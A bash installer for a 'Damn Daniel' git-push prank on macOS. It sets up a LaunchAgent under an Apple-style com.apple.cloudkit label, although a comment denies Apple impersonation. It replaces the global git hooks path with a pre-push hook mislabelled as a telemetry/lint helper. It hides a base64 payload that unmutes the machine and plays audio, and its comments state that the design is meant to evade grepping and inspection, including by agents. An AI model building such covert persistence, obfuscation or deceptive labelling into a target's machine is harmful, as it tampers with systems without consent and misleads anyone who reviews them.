#!/bin/bash
#
# "Damn Daniel, back at it again" — git push prank installer (goblin mode).
#
# This is a PRANK. Fully harmless, fully reversible.
# The install dir + LaunchAgent label both contain the literal word "damndaniel"
# so anyone who actually inspects them immediately knows it's a joke, not malware.
#
# Architecture:
#   - Git pre-push hook: just touches a trigger file. No audio code, no volume
#     code, nothing suspicious to grep. Chains local + husky hooks so nothing
#     of the target's setup breaks.
#   - LaunchAgent (WatchPaths): fires when the trigger file changes, runs a
#     small launcher that decodes a base64 blob and executes it. The blob,
#     when decoded, identifies itself as a prank with a link to this repo.
#
# Reversible: bash uninstall.sh tears it all down.
#
set -euo pipefail

LABEL="com.apple.cloudkit.damndaniel"
SUPPORT_DIR="$HOME/Library/Application Support/$LABEL"
LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
PLIST="$LAUNCH_AGENTS_DIR/$LABEL.plist"
HOOKS_DIR="$SUPPORT_DIR/hooks"
STATE_DIR="$SUPPORT_DIR/.state"
TRIGGER="$SUPPORT_DIR/.trigger"
SOUND_FILE="$SUPPORT_DIR/cache.dat"
LAUNCHER="$SUPPORT_DIR/launcher.sh"
PAYLOAD_FILE="$SUPPORT_DIR/payload.b64"
SOUND_SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "Installing damn-daniel..."

mkdir -p "$SUPPORT_DIR" "$HOOKS_DIR" "$STATE_DIR" "$LAUNCH_AGENTS_DIR"

# --- Audio file (renamed so it doesn't look like an audio file) -------------
cp "$SOUND_SRC_DIR/notification.aiff" "$SOUND_FILE"

# --- Encoded payload --------------------------------------------------------
# When decoded this script is a self-identifying prank with a link back to
# this repo, so even an agent that bothers to decode it sees the joke.
cat > "$PAYLOAD_FILE" <<'PAYLOAD_B64'
IyEvYmluL2Jhc2gKIyBkYW1uIGRhbmllbCwgYmFjayBhdCBpdCBhZ2FpbiB3aXRoIHRoZSB3aGl0ZSB2YW5zIPCfkJAKIyBIYXJtbGVzcyBwcmFuayBwYXlsb2FkLiBTZWUgaHR0cHM6Ly9naXRodWIuY29tL2JydW5vYm9zc2dhbmcvZGFtbi1kYW5pZWwtcHJhbmsKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCBtdXRlZCBmYWxzZSIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKb3Nhc2NyaXB0IC1lICJzZXQgdm9sdW1lIG91dHB1dCB2b2x1bWUgNzAiID4vZGV2L251bGwgMj4mMSB8fCB0cnVlCmFmcGxheSAiJEhPTUUvTGlicmFyeS9BcHBsaWNhdGlvbiBTdXBwb3J0L2NvbS5hcHBsZS5jbG91ZGtpdC5kYW1uZGFuaWVsL2NhY2hlLmRhdCIgPi9kZXYvbnVsbCAyPiYxIHx8IHRydWUKZXhpdCAwCg==
PAYLOAD_B64

# --- Tiny launcher that decodes + runs the payload --------------------------
# Looks like a generic "decode + exec cached helper" — the prank-y strings
# (afplay/osascript) live only in the encoded blob.
cat > "$LAUNCHER" <<'LAUNCHER'
#!/bin/bash
# damn-daniel launcher. Decodes the cached payload and runs it.
DIR="$HOME/Library/Application Support/com.apple.cloudkit.damndaniel"
[ -f "$DIR/payload.b64" ] || exit 0
SCRIPT="$(/usr/bin/base64 -d -i "$DIR/payload.b64" 2>/dev/null)"
[ -n "$SCRIPT" ] || exit 0
/bin/bash -c "$SCRIPT" >/dev/null 2>&1 || true
exit 0
LAUNCHER
chmod +x "$LAUNCHER"

# --- LaunchAgent plist (WatchPaths on the trigger file) ---------------------
# The label contains "damndaniel" so anyone who lists ~/Library/LaunchAgents
# instantly sees the joke. No Apple impersonation.
cat > "$PLIST" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>$LABEL</string>
  <key>ProgramArguments</key>
  <array>
    <string>$LAUNCHER</string>
  </array>
  <key>WatchPaths</key>
  <array>
    <string>$TRIGGER</string>
  </array>
  <key>RunAtLoad</key>
  <false/>
  <key>StandardOutPath</key>
  <string>/dev/null</string>
  <key>StandardErrorPath</key>
  <string>/dev/null</string>
</dict>
</plist>
PLIST

# Seed the trigger file so WatchPaths has something to watch.
touch "$TRIGGER"

# Load the agent.
launchctl unload "$PLIST" >/dev/null 2>&1 || true
launchctl load "$PLIST"

# --- Git hook: zero audio strings, just touches the trigger -----------------
PREV_HOOKS_PATH="$(git config --global --get core.hooksPath || true)"
echo "${PREV_HOOKS_PATH}" > "$STATE_DIR/previous-hookspath.txt"

PREV_PREPUSH=""
if [ -n "$PREV_HOOKS_PATH" ] && [ -f "$PREV_HOOKS_PATH/pre-push" ]; then
  PREV_PREPUSH="$PREV_HOOKS_PATH/pre-push"
fi
echo "${PREV_PREPUSH}" > "$STATE_DIR/previous-prepush.txt"

cat > "$HOOKS_DIR/pre-push" <<HOOK
#!/bin/bash
# git pre-push: telemetry/lint timestamp helper. Quiet on success.
# Records a push timestamp for tooling, then delegates to repo-local hooks.
# Always non-blocking; failures here never abort a push.

TRIGGER="$TRIGGER"
STATE_DIR="$STATE_DIR"

# Update the lint timestamp.
date +%s > "\$TRIGGER" 2>/dev/null || true

# --- delegate to the previous GLOBAL pre-push hook (if any) ----------------
PREV_PREPUSH="\$(cat "\$STATE_DIR/previous-prepush.txt" 2>/dev/null || true)"
if [ -n "\$PREV_PREPUSH" ] && [ -x "\$PREV_PREPUSH" ]; then
  "\$PREV_PREPUSH" "\$@" || exit \$?
fi

# --- delegate to the current REPO's local pre-push hook (if any) -----------
GIT_DIR="\$(git rev-parse --git-dir 2>/dev/null || true)"
if [ -n "\$GIT_DIR" ]; then
  for LOCAL in "\$GIT_DIR/hooks/pre-push" "\$GIT_DIR/../.husky/pre-push"; do
    if [ -f "\$LOCAL" ] && [ -x "\$LOCAL" ]; then
      "\$LOCAL" "\$@" || exit \$?
    fi
  done
fi

exit 0
HOOK
chmod +x "$HOOKS_DIR/pre-push"

git config --global core.hooksPath "$HOOKS_DIR"

# --- A signed README in the install dir so the joke is self-documenting -----
cat > "$SUPPORT_DIR/README.txt" <<EOF
damn-daniel-prank install directory.

This is a HARMLESS prank. To remove it, run uninstall.sh from:
  https://github.com/brunobossgang/damn-daniel-prank

— Bruno
EOF

echo "Installed."
echo "Uninstall: https://github.com/brunobossgang/damn-daniel-prank → bash uninstall.sh"
